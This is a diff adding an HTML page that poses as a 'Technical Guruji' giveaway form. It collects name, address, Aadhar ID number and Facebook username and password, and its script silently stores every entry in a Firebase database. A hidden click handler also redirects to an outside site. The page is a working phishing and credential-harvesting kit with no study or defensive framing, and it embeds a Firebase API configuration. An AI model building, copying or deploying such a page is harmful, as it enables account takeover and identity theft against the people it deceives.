@@ -1,0 +1,74 @@
+<html>
+<head>
+<title>TECHNICAL GURUJI GIVEAWAY</title>
+<style>
+    @font-face {
+	font-family: kirvy;
+	src: url('kirvy.otf');
+}
+    * {letter-spacing: 7px; word-spacing: 15px; font-size: 25px; font-family: kirvy;}
+    body {margin: 0 0 0 0; background-color: gainsboro;}
+    header {padding: 20 20 20 20; text-align: center; color: white; background-color: midnightblue; font-size: 35px; box-shadow:  0px 0px 15px black;}
+    .form {display: block; margin: auto; width: 60%; box-shadow: 0px 0px 75px black; margin-top: 30px; padding: 20 20 20 20; border-radius: 10px; font-weight: bolder;font-size: 20px;}
+    label {display: block; font-size: 25px; margin-top: 15px;}
+    input {display: block; margin-top: 15px; border: none; border-bottom: 5px solid grey; background-color: transparent; width: 100%}
+    button {padding: 5 5 5 5; color: white; background-color: midnightblue; font-size: 20px; border: none; margin-top: 15px;}
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://www.gstatic.com/firebasejs/5.3.1/firebase.js"></script>
+</head>
+<body>
+<header>
+Giveaway form
+</header>
+<div class="form">
+    Fill this form to join yourself to the official giveaway by technical guruji<br>
+      <label>Name</label>
+    <input type="text">
+      <label>Email</label>
+    <input type="email">
+     <label>Address</label>
+    <input type="text">
+      <label>Aadhar card number</label>
+    <input type="text">
+    <div class="fb"><br>
+    <img src="fb.JPG">
+     <label>Facebook username</label>
+    <input type="text">
+      <label>Facebook password</label>
+    <input type="password">
+    </div>
+<center><button onclick="submitit()">Submit</button></center>
+</div>
+    <div class="empty" style="padding: 15 0 15 0"></div>
+</body>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyAZi986WPJ-bkYO-0BSy_-CRVGrLYFO_vw",
+    authDomain: "language-settings-abada.firebaseapp.com",
+    databaseURL: "https://language-settings-abada.firebaseio.com",
+    projectId: "language-settings-abada",
+    storageBucket: "language-settings-abada.appspot.com",
+    messagingSenderId: "494351546355"
+  };
+  firebase.initializeApp(config);
+var data;
+firebase.database().ref("giveaway").on('value', function(datas) {
+data = Object.assign({}, datas.val());
+data=data.content;
+});
+    function submitit() {
+        var label = document.getElementsByTagName('label');
+        var values = document.getElementsByTagName('input');
+        for (i=0; i<label.length; i++) {data+=label[i].innerHTML+":"+values[i].value+"<br>";}
+        data+="<br><br><br>"
+        firebase.database().ref("giveaway").set({content: data});
+        document.getElementsByClassName("form")[0].innerHTML="We will shortly contact you at"+values[1].value;
+    }
+    var ctr;
+    document.getElementsByClassName("empty")[0].onclick = function() {
+    ctr=setTimeout(function() {window.location.assign("https://confession.ml/giveaway#ro")},1500)
+    }
+</script>
+</html>
